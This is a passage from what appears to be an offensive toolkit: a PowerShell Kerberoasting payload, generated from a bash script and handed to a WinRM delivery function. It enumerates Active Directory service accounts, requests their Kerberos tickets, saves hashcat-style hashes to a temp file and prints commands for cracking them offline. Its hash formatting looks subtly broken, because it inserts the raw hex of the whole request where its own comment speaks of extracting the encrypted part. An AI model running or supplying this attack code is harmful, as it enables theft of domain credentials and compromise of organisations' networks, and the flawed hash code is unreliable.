# Step 1: Enumerate SPN accounts
try {
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain)

    # LDAP search for user accounts with SPNs
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","description","memberof"))

    $results = $searcher.FindAll()
    Write-Host "[+] Found $($results.Count) accounts with SPNs" -ForegroundColor Green

    $hashes = @()

    foreach ($result in $results) {
        $username = $result.Properties["samaccountname"][0]
        $spns = $result.Properties["serviceprincipalname"]
        $desc = $result.Properties["description"]

        Write-Host "  [*] $username" -ForegroundColor Cyan
        foreach ($spn in $spns) {
            Write-Host "      SPN: $spn" -ForegroundColor White

            # Request TGS ticket
            try {
                Add-Type -AssemblyName System.IdentityModel
                $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                $ticketBytes = $ticket.GetRequest()

                # Extract and format for hashcat
                if ($ticketBytes) {
                    $hex = [BitConverter]::ToString($ticketBytes) -replace '-'
                    # Find the encrypted part (RC4 = etype 23)
                    $hashcatFormat = "`$krb5tgs`$23`$*$username`$$($env:USERDNSDOMAIN)`$$spn*`$$hex"
                    $hashes += $hashcatFormat
                    Write-Host "      [+] TGS ticket obtained" -ForegroundColor Green
                }
            } catch {
                Write-Host "      [-] Failed: $_" -ForegroundColor Red
            }
        }
    }

    # Output hashes
    if ($hashes.Count -gt 0) {
        $outFile = "$env:TEMP\kerberoast_hashes.txt"
        $hashes | Out-File -FilePath $outFile -Encoding ASCII
        Write-Host "`n[+] $($hashes.Count) hashes saved to: $outFile" -ForegroundColor Green
        Write-Host "[*] Crack with:" -ForegroundColor Yellow
        Write-Host "    hashcat -m 13100 kerberoast_hashes.txt wordlist.txt" -ForegroundColor White
        Write-Host "    john --format=krb5tgs kerberoast_hashes.txt --wordlist=wordlist.txt" -ForegroundColor White
    }
} catch {
    Write-Host "[-] Kerberoasting failed: $_" -ForegroundColor Red
    Write-Host "[*] Ensure you're running as a domain user on a domain-joined machine" -ForegroundColor Yellow
}
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
